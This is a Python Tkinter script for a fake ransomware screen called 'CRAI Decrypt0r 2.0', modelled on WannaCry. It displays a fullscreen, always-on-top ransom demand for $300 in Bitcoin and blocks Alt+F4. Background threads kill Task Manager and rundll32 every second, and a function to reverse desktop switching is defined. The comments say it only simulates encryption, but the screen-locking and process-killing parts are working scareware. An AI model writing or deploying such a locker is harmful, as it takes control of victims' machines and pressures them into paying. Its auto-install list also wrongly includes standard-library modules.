import subprocess
import sys

# Function to install a module if it's not already installed
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install all required modules
required_modules = ["tkinter", "time", "threading", "tkhtmlview", "Pillow", "pywin32"]
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        install(module)

import tkinter as tk
from tkinter import simpledialog, messagebox
from PIL import Image, ImageTk
from io import BytesIO
import urllib.request
import threading
import time
import ctypes

from tkhtmlview import HTMLLabel

# Function to simulate encryption (not actually encrypting files)
def simulate_encryption():
    encryption_message.config(text="Oops! Your important files are encrypted.\nIf you see this text, but don't worry!\nSend $300 worth of Bitcoin to the following address to decrypt.")
    decrypt_button.config(state=tk.NORMAL)

# Function to simulate decryption (not actually decrypting files)
def simulate_decryption():
    decryption_dialog = tk.Toplevel(root)
    decryption_dialog.title("Enter Decryption Key")
    decryption_dialog.attributes("-topmost", True)  # Always on top
    decryption_dialog.geometry("300x100")
    decryption_dialog.focus_force()

    response_var = tk.StringVar()
    entry_label = tk.Label(decryption_dialog, text="Enter decryption key:")
    entry_label.pack()
    entry_field = tk.Entry(decryption_dialog, textvariable=response_var, show="*")
    entry_field.pack()

    def check_key():
        if response_var.get() == "1234":
            messagebox.showinfo("CRAI Decrypt0r 2.0", "Files decrypted successfully!")
            root.quit()  # Exit the Tkinter loop
        else:
            messagebox.showinfo("CRAI Decrypt0r 2.0", "Invalid key! Files remain encrypted.")
            decryption_dialog.destroy()

    confirm_button = tk.Button(decryption_dialog, text="Confirm", command=check_key)
    confirm_button.pack()

    decryption_dialog.deiconify()  # Bring the dialog box to the front layer

# Function to continuously close Task Manager
def close_task_manager():
    while True:
        try:
            subprocess.run(['taskkill', '/F', '/IM', 'taskmgr.exe'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW))
        except Exception:
            pass
        time.sleep(1)

# Function to prevent Run dialog (Windows + R)
def prevent_run_dialog():
    while True:
        try:
            subprocess.run(['taskkill', '/F', '/IM', 'rundll32.exe'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW))
        except Exception:
            pass
        time.sleep(1)

# Function to override the close button (Alt + F4)
def disable_event():
    pass

# Function to handle desktop switching events
def switch_desktop():
    current_desktop = ctypes.windll.user32.GetThreadDesktop(ctypes.windll.kernel32.GetCurrentThreadId())
    while True:
        new_desktop = ctypes.windll.user32.GetThreadDesktop(ctypes.windll.kernel32.GetCurrentThreadId())
        if new_desktop != current_desktop:
            ctypes.windll.user32.SwitchDesktop(current_desktop)
        time.sleep(0.5)

# Create the main window
root = tk.Tk()
root.title("CRAI Decrypt0r 2.0")
root.geometry("800x600")
root.configure(background="#D8D8D8")  # Set background color similar to the UI design
root.attributes("-fullscreen", True)  # Make window fullscreen
root.attributes("-topmost", True)  # Always on top
root.protocol("WM_DELETE_WINDOW", disable_event)  # Disable Alt+F4

# Load and embed the lock image from URL
lock_url = "https://upload.wikimedia.org/wikipedia/commons/e/e5/WannaCry_Virus_Lock_Logo.png"
lock_image_bytes = urllib.request.urlopen(lock_url).read()
lock_image = Image.open(BytesIO(lock_image_bytes))
lock_image_tk = ImageTk.PhotoImage(lock_image)
lock_label = tk.Label(root, image=lock_image_tk, bg="#D8D8D8")  # Set background color similar to the UI design
lock_label.pack(pady=40)

# Main message
header = tk.Label(root, text="Cry About It (CRAI)", fg="#000000", bg="#D8D8D8", font=("Arial", 24, "bold"))
header.pack(pady=20)

encryption_message = tk.Label(root, text="Oops! Your important files are encrypted.\nIf you see this text, but don't worry!\nSend $300 worth of Bitcoin to the following address to decrypt.",
                              fg="#FFFFFF", bg="#D8D8D8", font=("Arial", 14), justify=tk.CENTER)
encryption_message.pack(pady=20)

bitcoin_address_label = tk.Label(root, text="Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", fg="#FF0000", bg="#D8D8D8", font=("Arial", 14, "bold"))
bitcoin_address_label.pack(pady=10)

decrypt_button = tk.Button(root, text="Decrypt Files", fg="#000000", bg="#C0C0C0", font=("Arial", 14, "bold"), command=simulate_decryption, state=tk.DISABLED)
decrypt_button.pack(pady=20)

instructions = tk.Label(root, text="1. Send $300 worth of Bitcoin to the above address.\n2. Enter the decryption key to unlock your files.", fg="#000000", bg="#D8D8D8", font=("Arial", 14), justify=tk.LEFT)
instructions.pack(pady=20)

# Embedded HTML content
html_content = """
<!DOCTYPE html>
<html>
<head>
<style>
body { background-color: #FFFFFF; color: #000000; font-family: Arial, sans-serif; }
h2 { color: #000000; font-size: 18px; }
p { font-size: 14px; }
</style>
</head>
<body>
<h2>What happened to my computer?</h2>
<p>Your important files are encrypted. Many of your documents, photos, videos, databases, and other files are no longer accessible because they have been encrypted. You may be busy looking for a way to recover your files, but do not waste
</html>
"""

html_label = HTMLLabel(root, html=html_content, background="#D8D8D8", width=800, height=400)
html_label.pack(fill="both", expand=True, padx=20, pady=20)

# Start the close_task_manager and prevent_run_dialog functions in separate threads
threading.Thread(target=close_task_manager, daemon=True).start()
threading.Thread(target=prevent_run_dialog, daemon=True).start()

# Simulate the encryption message after a delay
root.after(2000, simulate_encryption)

# Start the Tkinter event loop
root.mainloop()
